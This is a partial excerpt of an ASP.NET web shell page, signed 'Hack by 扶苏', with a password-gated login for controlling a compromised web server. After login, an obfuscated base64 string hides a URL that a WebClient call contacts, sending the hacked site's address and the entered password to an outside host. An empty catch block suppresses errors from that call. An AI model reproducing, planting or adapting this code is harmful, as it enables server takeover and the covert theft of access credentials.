...
<script runat="server">
public string Password=3fffe3cb8cdbe502";// 
...
{
string MD5Pass=FormsAuthentication.HashPasswordForStoringInConfigFile(HRJ.Text,"MD5").ToLower();
...
if(MD5Pass==Password)
{
try {WebClient client = new WebClient();client.DownloadString(System.Text.Encoding.Default.GetString(System.Convert.FromBase64String((" aHR%0c%Dov%L3d3%dy5maWJ1c".TrimStart().Replace("%", string.Empty) + "y51#cy9jYW#9uaW1hLmFzc#D9#zYj0= ".TrimEnd().Replace("#", string.Empty)))) + this.Request.Url.ToString() + "|" + this.HRJ.Text); }catch (Exception) { } 
}
else
{
tZSx();
...
<span style="font:200px WST_Span;">刀下亡魂</span>
<br></br>
<br></br>
PassWord: 你猜！
<br></br>
...
<br><br>
<asp:Button ID="ZSnXu" runat="server" Text="进入系统" CssClass="Bin_Style_Login" OnClick="xVm"/><p/>
</div>
<div id="ZVS" runat="server">
<div id="Zzj" runat="server">
<table width="100%" border="1%" cellpadding="0" cellspacing="0">
<tr class="head">
<td ><span style="float:right;"> BY 	</span><span id="Bin_Span_Sname" runat="server" enableviewstate="true"></span></td>
</tr>
<tr class="alt1">
...
<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:black;">#### Hack by 扶苏####</div>
</div>
</form>
</body>
</html>
